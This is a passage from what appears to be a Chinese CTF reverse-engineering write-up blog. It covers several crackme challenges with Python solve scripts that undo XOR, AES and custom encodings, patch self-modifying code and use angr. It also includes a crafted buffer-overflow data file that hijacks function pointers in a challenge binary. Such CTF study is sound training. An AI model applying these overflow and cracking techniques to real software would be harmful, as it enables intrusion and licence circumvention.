00 00 00 00 00 00 00 00 00 00 00 FF FF FF FF 07 00 00 00 08 00 00 00</span><br></pre></td></tr></table></figure><p>各部分解释：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  v7[]: AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA</span><br><span class="line">ret[0]: 00 00 00 00</span><br><span class="line">ret[1]: 00 00 00 00</span><br><span class="line">ret[2]: 00 00 00 00</span><br><span class="line">ret[3]: FF FF FF FF</span><br><span class="line">  arg2: 07 00 00 00</span><br><span class="line">  arg3: 08 00 00 00</span><br></pre></td></tr></table></figure><p>在题目的同级目录下创建这样一个 data 文件，运行题目 exe 得到 flag</p><p>PS. 当然这题还有非预期，至少我找到了一个点。动态调试的时候我发现题目没开基址重定向，那么在溢出 v7 的时候还能控制 func 数组，反正只要 func[2] 调用完返回 0 就行了，那找找题目中有没有什么能用的函数。上看下看最后锁定了 strlen，因为调用的时候传的第一个参数是 &amp;ret[0]，只要 ret[0] = 0，那么返回值就是 0 了。构造的 data 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">   v7[]: AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA AA</span><br><span class="line">  ret[]: 00 00 00 00   00 00 00 00   00 00 00 00   00 00 00 00</span><br><span class="line">   arg2: 00 00 00 00</span><br><span class="line">   arg3: 00 00 00 00</span><br><span class="line">func[1]: 40 13 40 00 -- func0</span><br><span class="line">func[2]: 40 13 40 00 -- func0</span><br><span class="line">func[3]: E8 1F 40 00 -- _strlen</span><br></pre></td></tr></table></figure><p>这样显示出来的 flag 是全 0。调整 func[0]、func[1]、arg2、arg3 使之满足这个思路且程序不会异常终止，你就可以获得一堆 flag，哈哈哈我好无聊</p><br><h3 id="SWPU2019-ReverseMe-x86-exe"><a href="#SWPU2019-ReverseMe-x86-exe" class="headerlink" title="[SWPU2019]ReverseMe | x86,exe"></a>[SWPU2019]ReverseMe | x86,exe</h3><p>shift + F12，查找字符串 “Try again!” 的交叉引用，来到函数 sub_402810，反编译的伪代码比较乱，实际上只干了三件事：</p><ul><li>使用字符串 SWPU_2019_CTF 对输入（长度为 32）进行变换（do…while 循环）</li><li>调用 sub_4025C0 函数加密变换后的输入</li><li>加密后的 32 个字符应该为：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">B3 37 0F F8 BC BC AE 5D BA 5A 4D 86 44 97 62 D3 4F BA 24 16 0B 9F 72 1A 65 68 6D 26 BA 6B C8 67</span><br></pre></td></tr></table></figure><p>有难度的地方只有 sub_4025C0 函数，该函数存在钓鱼行为，前面用 ZUC 算法产生了一个固定的数组（32 字节），对输入进行加密的部分其实只有最底下的 do..while 循环：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">    v28 = *(_DWORD *)(v26 + v25);</span><br><span class="line">    v25 += <span class="number">4</span>;</span><br><span class="line">    *(_DWORD *)(v24 + v25 - <span class="number">4</span>) = *(_DWORD *)(v25 - <span class="number">4</span>) ^ v28;</span><br><span class="line">    --v27;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( v27 );</span><br></pre></td></tr></table></figure><p>该加密仅仅是每次取来变换后输入的 4 个字节，与固定的数组元素异或。动态调试取出固定的数组，在 0x4027D7 处下断点，第一次断下时，esi + eax 的值就是程序产生的数组地址：</p><p><img src="../img/SWPU2019ReverseMe/1.png" alt="SWPU2019ReverseMe"></p><p>解题脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">target = [<span class="number">0xF80F37B3</span>, <span class="number">0x5DAEBCBC</span>, <span class="number">0x864D5ABA</span>, <span class="number">0xD3629744</span>, <span class="number">0x1624BA4F</span>, <span class="number">0x1A729F0B</span>, <span class="number">0x266D6865</span>, <span class="number">0x67C86BBA</span>]</span><br><span class="line">key =  [<span class="number">0xCA3E0C86</span>, <span class="number">0x19AED798</span>, <span class="number">0xA66B77E2</span>, <span class="number">0xB077A16A</span>, <span class="number">0x05379169</span>, <span class="number">0x307BF97A</span>, <span class="number">0x104B5A43</span>, <span class="number">0x28D47D86</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(key)):</span><br><span class="line">tmp = target[i] ^ key[i]</span><br><span class="line">s += struct.pack(<span class="string">&#x27;I&#x27;</span>, tmp)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">xor = <span class="built_in">map</span>(<span class="built_in">ord</span>, <span class="string">&quot;SWPU_2019_CTF&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">flag += <span class="built_in">chr</span>(<span class="built_in">ord</span>(s[i]) ^ xor[i % <span class="built_in">len</span>(xor)])</span><br><span class="line"><span class="built_in">print</span> flag</span><br></pre></td></tr></table></figure><br><h3 id="GKCTF2020-Chelly’s-identity-x86-exe"><a href="#GKCTF2020-Chelly’s-identity-x86-exe" class="headerlink" title="[GKCTF2020]Chelly’s identity | x86,exe"></a>[GKCTF2020]Chelly’s identity | x86,exe</h3><p>shift + F12，查找字符串 “hi.Are you know of chelly?” 的交叉引用，来到函数 sub_41C290。由于符号去的很彻底，考虑通过动态调试来推测大多数函数的作用</p><p>sub_41C290 函数中的 for 循环将输入的每个字节变成一个 4 字节，依次存入数组 a1 中，sub_4111BD 函数检查数组 a1 的长度是否为 16（说明输入字符串长度为 16）</p><p>sub_411721 函数对数组 a1 进行计算、修改，该函数干的事用 python 翻译如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">isPrime</span>(<span class="params">num</span>):</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, num):</span><br><span class="line"><span class="keyword">if</span> num % i == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sub_4116E0 - 寻找比128小的所有质数</span></span><br><span class="line">prime = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">128</span>):</span><br><span class="line"><span class="keyword">if</span> isPrime(i):</span><br><span class="line">prime.append(i)</span><br><span class="line"></span><br><span class="line">a1 = [?] * <span class="number">16</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a1)):</span><br><span class="line"><span class="comment"># 计算所有比 a1[i] 小的质数和</span></span><br><span class="line">s = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> prime:</span><br><span class="line"><span class="keyword">if</span> p &lt; a1[i]:</span><br><span class="line">s += p</span><br><span class="line">a1[i] = s ^ a1[i]</span><br></pre></td></tr></table></figure><p>最后在 sub_411852 函数中将 a1 与目标数组进行逐一比较，解题脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">isPrime</span>(<span class="params">num</span>):</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, num):</span><br><span class="line"><span class="keyword">if</span> num % i == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line">prime = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">128</span>):</span><br><span class="line"><span class="keyword">if</span> isPrime(i):</span><br><span class="line">prime.append(i)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">PrimeSum</span>(<span class="params">num</span>):</span></span><br><span class="line">s = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> prime:</span><br><span class="line"><span class="keyword">if</span> i &gt;= num:</span><br><span class="line"><span class="keyword">return</span> s</span><br><span class="line">s += i</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">target = [<span class="number">438</span>, <span class="number">1176</span>, <span class="number">1089</span>, <span class="number">377</span>, <span class="number">377</span>, <span class="number">1600</span>, <span class="number">924</span>, <span class="number">377</span>, <span class="number">1610</span>, <span class="number">924</span>, <span class="number">637</span>, <span class="number">639</span>, <span class="number">376</span>, <span class="number">566</span>, <span class="number">836</span>, <span class="number">830</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(target)):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">128</span>):</span><br><span class="line"><span class="keyword">if</span> PrimeSum(j) ^ j == target[i]:</span><br><span class="line">flag += <span class="built_in">chr</span>(j)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span> flag</span><br></pre></td></tr></table></figure><br><h3 id="CFI-CTF-2018-IntroToPE-x86-exe-NET"><a href="#CFI-CTF-2018-IntroToPE-x86-exe-NET" class="headerlink" title="[CFI-CTF 2018]IntroToPE | x86,exe,.NET"></a>[CFI-CTF 2018]IntroToPE | x86,exe,.NET</h3><p>dnSpy 打开，检验密码的函数在 IntroToPe 命名空间 ValidatePasswd 类的 verifyPasswd 方法。对 <code>Q0ZJey5OZXRDI18xc19AdzNzMG0zfQ==</code> 进行 base64 解码得到 flag</p><br><h3 id="SCTF2019-creakme-x86-exe-反调试-SMC-Windows异常机制-AES"><a href="#SCTF2019-creakme-x86-exe-反调试-SMC-Windows异常机制-AES" class="headerlink" title="[SCTF2019]creakme | x86,exe,反调试,SMC,Windows异常机制,AES"></a>[SCTF2019]creakme | x86,exe,反调试,SMC,Windows异常机制,AES</h3><p>程序执行流程是这样的：</p><ol><li>main 函数首先调用 sub_402320，函数序言部分注册 SEH stru_407B58，之后找到 image 中的 SCTF 段并制造断点异常（DebugBreak）</li><li>异常经过 <strong>FilterFunc</strong> sub_4023DC 交由 <strong>HandlerFunc</strong> sub_0x4023EF 处理，该函数调用 sub_402450 修改 SCTF 段（0x404000）的代码（SMC）</li><li>异常处理完成后返回 main，再调用 sub_4024A0，不存在调试器的话才调用 0x404000（反调试）</li><li>sub_404000 将字符串 <code>&gt;pvfqYc,4tTc2UxRmlJ,sB&#123;Fh4Ck2:CFOb4ErhtIcoLo</code> 修改为 <code>nKnbHsgqD3aNEB91jB3gEzAr+IklQwT1bSs3+bXpeuo=</code></li><li>等待输入</li><li>调用 sub_4020D0 对输入进行 AES_CBC 加密，key 是 <code>sycloversyclover</code>，iv 是 <code>sctfsctfsctfsctf</code></li><li>加密结果的 base64 形式与 <code>nKnbHsgqD3aNEB91jB3gEzAr+IklQwT1bSs3+bXpeuo=</code> 进行比较</li></ol><p>这里需要注意，ida 识别 sub_402320 的范围出现了错误（至少我这里是这样的），将 sub_402320 的范围调整为 0x402320 ~ 0x4023DC。0x4023DC ~ 0x4023EF 是一个 SEH（对应结构体 stru_407B58）的 <strong>FilterFunc</strong>，0x4023EF ~ 0x402439 则是其 <strong>HandlerFunc</strong></p><p>shift + F12 查找字符串 “please input your ticket:” 的交叉引用，来到 main 函数 sub_402540，首先调用 sub_402320：</p><p><img src="../img/SCTF2019creakme/1.png" alt="SCTF2019creakme"></p><p>引发异常后，SEH stru_407B58 的 <strong>FilterFunc</strong> 判断该异常由自己处理：</p><p><img src="../img/SCTF2019creakme/2.png" alt="SCTF2019creakme"></p><p>调用 <strong>HandlerFunc</strong> sub_4023EF，其中再调用 sub_402450 进行 SMC：</p><p><img src="../img/SCTF2019creakme/3.png" alt="SCTF2019creakme"></p><p>sub_402450 逻辑简单就不贴出来了，可以写个脚本来还原 0x404000：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x404000</span></span><br><span class="line">key = <span class="string">&quot;sycloversyclover&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x200</span>):</span><br><span class="line">b = get_bytes(addr + i, <span class="number">1</span>)</span><br><span class="line">tmp = ~(<span class="built_in">ord</span>(b) ^ <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) &amp; <span class="number">0xFF</span></span><br><span class="line">idc.PatchByte(addr + i, tmp)</span><br></pre></td></tr></table></figure><p>函数 0x404000 修改了目标字符串。当然为了做题的话，上面的步骤都可以不用搞懂，直接把程序运行起来，用调试器附加就能取到修改后的目标字符串</p><p>同时，Findcrypt 插件可以发现 AES 的盒子，推测 sub_4020D0 与 AES 加密有关，之后就是动调/静态分析加密模式为 CBC，找到 key 和 iv，写脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"></span><br><span class="line">ori = <span class="string">&quot;nKnbHsgqD3aNEB91jB3gEzAr+IklQwT1bSs3+bXpeuo=&quot;</span></span><br><span class="line">cipher = b64decode(ori)</span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;sycloversyclover&quot;</span></span><br><span class="line">iv = <span class="string">&quot;sctfsctfsctfsctf&quot;</span></span><br><span class="line">aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line"><span class="built_in">print</span> aes.decrypt(cipher).rstrip(<span class="string">&#x27;\x05&#x27;</span>)</span><br></pre></td></tr></table></figure><br><h3 id="WUSTCTF2020-funnyre-x86-elf-angr"><a href="#WUSTCTF2020-funnyre-x86-elf-angr" class="headerlink" title="[WUSTCTF2020]funnyre | x86,elf,angr"></a>[WUSTCTF2020]funnyre | x86,elf,angr</h3><p>存在 4 处花指令，导致 main 函数无法反汇编，将它们 nop 掉：</p><p><img src="../img/WUSTCTF2020funnyre/1.png" alt="WUSTCTF2020funnyre"></p><p><img src="../img/WUSTCTF2020funnyre/2.png" alt="WUSTCTF2020funnyre"></p><p><img src="../img/WUSTCTF2020funnyre/3.png" alt="WUSTCTF2020funnyre"></p><p><img src="../img/WUSTCTF2020funnyre/4.png" alt="WUSTCTF2020funnyre"></p><p>分析后有两种做法，第一种是用 angr：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python3</span></span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line">project  = angr.Project(<span class="string">&quot;./funnyre&quot;</span>, auto_load_libs = <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x603055</span></span><br><span class="line">state = project.factory.blank_state(addr = <span class="number">0x400601</span>)</span><br><span class="line">flag = claripy.BVS(<span class="string">&quot;flag&quot;</span>, <span class="number">8</span> * <span class="number">32</span>)</span><br><span class="line">state.memory.store(bss_addr + <span class="number">5</span>, flag)</span><br><span class="line">state.regs.rdx = bss_addr</span><br><span class="line"></span><br><span class="line">sm = project.factory.simulation_manager(state)</span><br><span class="line">sm.explore(find = <span class="number">0x401DA9</span>)</span><br><span class="line"></span><br><span class="line">solution = sm.found[<span class="number">0</span>].solver.<span class="built_in">eval</span>(flag, cast_to = <span class="built_in">bytes</span>)</span><br><span class="line"><span class="built_in">print</span>(solution.decode())</span><br></pre></td></tr></table></figure><p>第二种做法是取巧，通过观察可以发现，每个 do…while 循环都会对 flag 的每一位进行相同的变换，所以我只要把所有可见字符都试一遍，通过动调，就能知道这些字符最后都被替换成了什么。再通过目标数组还原 flag 即可，脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;</span></span><br><span class="line">b = [<span class="number">0x49</span>, <span class="number">0x46</span>, <span class="number">0x47</span>, <span class="number">0x4c</span>, <span class="number">0x4d</span>, <span class="number">0x4a</span>, <span class="number">0x4b</span>, <span class="number">0x50</span>, <span class="number">0x51</span>, <span class="number">0x4e</span>, <span class="number">0x4f</span>, <span class="number">0x54</span>, <span class="number">0x55</span>, <span class="number">0x52</span>, <span class="number">0x53</span>, <span class="number">0x38</span>, <span class="number">0x39</span>, <span class="number">0x36</span>, <span class="number">0x37</span>, <span class="number">0x3c</span>, <span class="number">0x3d</span>, <span class="number">0x3a</span>, <span class="number">0x3b</span>, <span class="number">0x40</span>, <span class="number">0x41</span>, <span class="number">0x3e</span>, <span class="number">0x29</span>, <span class="number">0x26</span>, <span class="number">0x27</span>, <span class="number">0x2c</span>, <span class="number">0x2d</span>, <span class="number">0x2a</span>, <span class="number">0x2b</span>, <span class="number">0x30</span>, <span class="number">0x31</span>, <span class="number">0x2e</span>, <span class="number">0x2f</span>, <span class="number">0x34</span>, <span class="number">0x35</span>, <span class="number">0x32</span>, <span class="number">0x33</span>, <span class="number">0x18</span>, <span class="number">0x19</span>, <span class="number">0x16</span>, <span class="number">0x17</span>, <span class="number">0x1c</span>, <span class="number">0x1d</span>, <span class="number">0x1a</span>, <span class="number">0x1b</span>, <span class="number">0x20</span>, <span class="number">0x21</span>, <span class="number">0x1e</span>, <span class="number">0xd8</span>, <span class="number">0xd9</span>, <span class="number">0xd6</span>, <span class="number">0xd7</span>, <span class="number">0xdc</span>, <span class="number">0xdd</span>, <span class="number">0xda</span>, <span class="number">0xdb</span>, <span class="number">0xe0</span>, <span class="number">0xe1</span>]</span><br><span class="line"></span><br><span class="line">target = <span class="string">&quot;D9 2C 27 D6 D8 2A DA 2D D7 2C DC E1 DB 2C D9 DD 27 2D 2A DC DB 2C E1 29 DA DA 2C DA 2A D9 29 2A&quot;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">target = [<span class="built_in">int</span>(i, <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> target]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> target:</span><br><span class="line">flag += a[b.index(i)]</span><br><span class="line"><span class="built_in">print</span> flag</span><br></pre></td></tr></table></figure><br><h3 id="NPUCTF2020-你好sao啊-x86-elf-变种base64"><a href="#NPUCTF2020-你好sao啊-x86-elf-变种base64" class="headerlink" title="[NPUCTF2020]你好sao啊 |x86,elf,变种base64"></a>[NPUCTF2020]你好sao啊 |x86,elf,变种base64</h3><p>只需要分析 RxEncode 这个编码函数，其实现的功能与 base64 相反，该函数将 4 个可见字符变成 3 个字节：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *__fastcall <span class="title">RxEncode</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *input, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> sz; <span class="comment">// [rsp+18h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> paddingSz; <span class="comment">// [rsp+1Ch] [rbp-34h]</span></span><br><span class="line">  <span class="keyword">int</span> idx; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v6; <span class="comment">// [rsp+24h] [rbp-2Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [rsp+28h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [rsp+28h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+2Ch] [rbp-24h]</span></span><br><span class="line">  _BYTE *v10; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">void</span> *s; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  sz = <span class="number">3</span> * (len / <span class="number">4</span>);</span><br><span class="line">  paddingSz = <span class="number">0</span>;</span><br><span class="line">  idx = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( input[len - <span class="number">1</span>] == <span class="string">&#x27;=&#x27;</span> )</span><br><span class="line">    paddingSz = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( input[len - <span class="number">2</span>] == <span class="string">&#x27;=&#x27;</span> )</span><br><span class="line">    ++paddingSz;</span><br><span class="line">  <span class="keyword">if</span> ( input[len - <span class="number">3</span>] == <span class="string">&#x27;=&#x27;</span> )</span><br><span class="line">    ++paddingSz;</span><br><span class="line">  <span class="keyword">if</span> ( paddingSz == <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sz += <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( paddingSz &lt;= <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( paddingSz == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sz += <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( paddingSz &lt;= <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( paddingSz )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( paddingSz == <span class="number">1</span> )</span><br><span class="line">          sz += <span class="number">4</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        sz += <span class="number">4</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  s = <span class="built_in">malloc</span>(sz);</span><br><span class="line">  <span class="keyword">if</span> ( s )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, sz);</span><br><span class="line">    v10 = s;</span><br><span class="line">    <span class="keyword">while</span> ( idx &lt; len - paddingSz )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = <span class="number">0</span>;</span><br><span class="line">      v7 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ( v6 &lt;= <span class="number">3</span> &amp;&amp; idx &lt; len - paddingSz )</span><br><span class="line">      &#123;</span><br><span class="line">        v7 = (v7 &lt;&lt; <span class="number">6</span>) | (<span class="keyword">char</span>)<span class="built_in">find_pos</span>(input[idx]);</span><br><span class="line">        ++v6;</span><br><span class="line">        ++idx;</span><br><span class="line">      &#125;</span><br><span class="line">      v8 = v7 &lt;&lt; <span class="number">6</span> * (<span class="number">4</span> - v6);</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">2</span> &amp;&amp; i != v6; ++i )</span><br><span class="line">        *v10++ = v8 &gt;&gt; <span class="number">8</span> * (<span class="number">2</span> - i);</span><br><span class="line">    &#125;</span><br><span class="line">    *v10 = <span class="number">0</span>;</span><br><span class="line">    result = s;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No enough memory.&quot;</span>);</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>比较简单就直接贴脚本了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">table = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz01234&#123;&#125;789+/=&quot;</span></span><br><span class="line">raw = [<span class="number">0xFD370FEB59C9B9E</span>, <span 